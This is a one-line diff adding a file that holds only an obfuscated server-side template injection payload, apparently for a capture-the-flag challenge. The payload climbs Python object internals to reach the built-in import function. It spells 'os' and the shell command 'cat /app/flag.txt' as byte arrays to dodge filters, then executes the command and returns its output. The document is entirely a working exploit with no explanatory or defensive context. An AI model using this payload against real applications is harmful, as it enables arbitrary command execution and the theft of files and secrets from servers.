@@ -1,0 +1,1 @@
+{{ self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([111, 115]).decode()).popen(self.__init__.__globals__.__builtins__.bytes([99, 97, 116, 32, 47, 97, 112, 112, 47, 102, 108, 97, 103, 46, 116, 120, 116]).decode()).read() }}
